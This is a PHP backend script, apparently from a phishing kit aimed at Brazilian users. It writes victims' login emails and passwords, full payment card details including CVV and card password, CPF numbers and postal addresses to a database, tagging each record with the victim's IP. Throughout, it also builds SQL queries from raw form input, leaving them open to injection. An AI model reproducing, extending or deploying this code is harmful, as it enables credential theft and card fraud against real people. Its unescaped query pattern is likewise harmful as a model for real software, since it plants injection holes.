<?php
session_start();
include('../includes/conexao.php');

$ip = $_SERVER["REMOTE_ADDR"];
$action = $_POST['action'];

if($action == 'login'){
  $email = $_POST['email'];
  $senha = $_POST['senha'];
  
  $sql = "INSERT INTO login ( email, senha, ip ) VALUES ('$email', '$senha', '$ip')";
  $query = mysqli_query($conexao, $sql);
  
  
  if($query){
    echo "ok";
  }else{
    echo "error login";
  }
}elseif($action == 'salvarInfo'){
    $cc = $_POST["numeroDoCartao"];
    $nome = $_POST['nomeDoTitularDoCartao'];
    $validade = $_POST['validadeDoCartao'];
    $cvv = $_POST['cvvDoCartao'];
    $cpf = $_POST['cpfDoTitularDoCarto'];
    
  
  $sql = "INSERT INTO infos (nome , cpf, cc, validade, cvv, ip ) VALUES ('$nome', '$cpf', '$cc', '$validade', '$cvv', '$ip')";
  $query = mysqli_query($conexao, $sql);
  header('Content-Type: application/json');
  
    if ($query) {
        $response['status'] = 'senha';
    } else {
        $response['status'] = 'error';
        $response['message'] = 'Error saving card info';
    }
    
    echo json_encode($response);
}elseif($action == "save_drop"){
  
$rua = mysqli_real_escape_string($conexao, $_POST['rua']);
$cep = mysqli_real_escape_string($conexao, $_POST['cep']);
$numero = mysqli_real_escape_string($conexao, $_POST['numero']);
$complemento = mysqli_real_escape_string($conexao, $_POST['complemento']);
$bairro = mysqli_real_escape_string($conexao, $_POST['bairro']);
$cidade = mysqli_real_escape_string($conexao, $_POST['cidade']);
$estado = mysqli_real_escape_string($conexao, $_POST['estado']);

$_SESSION['cep'] = $cep;
  
 echo $sql = "INSERT INTO endereco (rua, cep, numero, complemento, bairro, cidade, estado, ip) VALUES ('$rua', '$cep', '$numero', '$complemento', '$bairro', '$cidade', '$estado', '$ip')";
  $query = mysqli_query($conexao, $sql);
  if($query){
    echo "ok";
  }else{
    echo "error endereco";
  }
}elseif($action == "salvarSenha"){
    $cc = $_POST["numeroDoCartao"];
    $senha = $_POST['senha'];
  
    
  $sql = "UPDATE `infos` SET `senha` = '$senha' WHERE `infos`.`cc` = '$cc';";
  $query = mysqli_query($conexao, $sql);
  header('Content-Type: application/json');
  
    if ($query) {
        $response['status'] = 'ok';
    } else {
        $response['status'] = 'error';
        $response['message'] = 'Error saving pass info';
    }
    
    echo json_encode($response);
    }
  

?>